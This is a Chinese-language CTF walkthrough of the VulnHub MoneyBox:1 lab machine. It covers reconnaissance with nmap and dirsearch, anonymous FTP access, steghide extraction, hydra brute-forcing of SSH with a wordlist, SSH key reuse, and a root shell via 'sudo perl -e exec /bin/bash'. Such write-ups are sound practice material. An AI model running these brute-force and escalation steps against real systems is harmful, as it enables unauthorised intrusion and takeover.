## 复盘*

## 靶机地址

[MoneyBox: 1 ~ VulnHub](https://www.vulnhub.com/entry/moneybox-1,653/)

![image-20250309084029932](./assets/image-20250309084029932.png)





## 信息收集





### 主机探活

```
arp-scan -l --interface=eth1
```

![image-20250309084106246](./assets/image-20250309084106246.png)

确定靶机ip：192.168.56.141





### 扫描目标主机的开放端口

```
nmap -sS -sV -p- -Pn 192.168.56.141
```

![image-20250309084150430](./assets/image-20250309084150430.png)

开放了：

- 21 ftp服务
- 22 ssh服务
- 80 http服务







### 利用CTFEnum扫描

```
CTFEnum 192.168.56.141
```

![image-20250309084248660](./assets/image-20250309084248660.png)

![image-20250309084252028](./assets/image-20250309084252028.png)

扫描结果可知：FTP服务允许匿名登录，且存在trydofind.jpg文件





### 匿名登录ftp服务，并将文件保存至本地

```
lftp 192.168.56.141 -u anonymous
```

![image-20250309084348951](./assets/image-20250309084348951.png)







### 利用steghide扫描该jpg文件

![image-20250309084428171](./assets/image-20250309084428171.png)

存在隐写，尝试免密提取失败





### 访问192.168.56.141

![image-20250309084449269](./assets/image-20250309084449269.png)



无关键信息





### 扫描网站目录

```
dirsearch -u 192.168.56.141
```

![image-20250309084518686](./assets/image-20250309084518686.png)

![image-20250309084522556](./assets/image-20250309084522556.png)

存在：blogs目录





### 访问blogs

![image-20250309084549236](./assets/image-20250309084549236.png)

查看源码

![image-20250309084600537](./assets/image-20250309084600537.png)

提示查看目录：S3cr3t-T3xt

![image-20250309084613785](./assets/image-20250309084613785.png)

查看源码

![image-20250309084621920](./assets/image-20250309084621920.png)





### 利用steghide提取信息

```
steghide --extract -sf trytofind.jpg
```

![image-20250309084642621](./assets/image-20250309084642621.png)

成功提取data.txt文件





### 查看data.txt文件

![image-20250309084713473](./assets/image-20250309084713473.png)

提示用户为renu，弱口令密码





### 利用hydra爆破ssh服务

```
hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.141
```

![image-20250309084811811](./assets/image-20250309084811811.png)

得到用户密码：

```
renu：987654321
```



## 提权



登录ssh服务



### 得到第一个flag

```
ls -al
cat user1.txt
```

![image-20250309084914828](./assets/image-20250309084914828.png)



### 尝试sudo -l

```
sudo -l
```

![image-20250309084939950](./assets/image-20250309084939950.png)

无结果





### 进入lily家目录

```
cd /home/lily
ls -al
```

![image-20250309085016947](./assets/image-20250309085016947.png)

发现user2.txt文件可读





### 拿到第二个flag

```
cat user2.txt
```

![image-20250309085052260](./assets/image-20250309085052260.png)



### 查看.ssh文件夹

```
ls -al
cat authorized_key
```

![image-20250309085110540](./assets/image-20250309085110540.png)

发现存在renu的公钥，即renu可以实现免密登录lily





### 尝试ssh免密登录

```
ssh lily@localhost 
```

![image-20250309085209146](./assets/image-20250309085209146.png)



### 执行sudo -l

```
sudo -l
```

![image-20250309085227680](./assets/image-20250309085227680.png)



### perl提权

```
sudo perl -e 'exec "/bin/bash"'
```

![image-20250309085239568](./assets/image-20250309085239568.png)



### 得到最后一个flag

```
cd /root
ls -al
cat .root.txt
```

![image-20250309085315869](./assets/image-20250309085315869.png)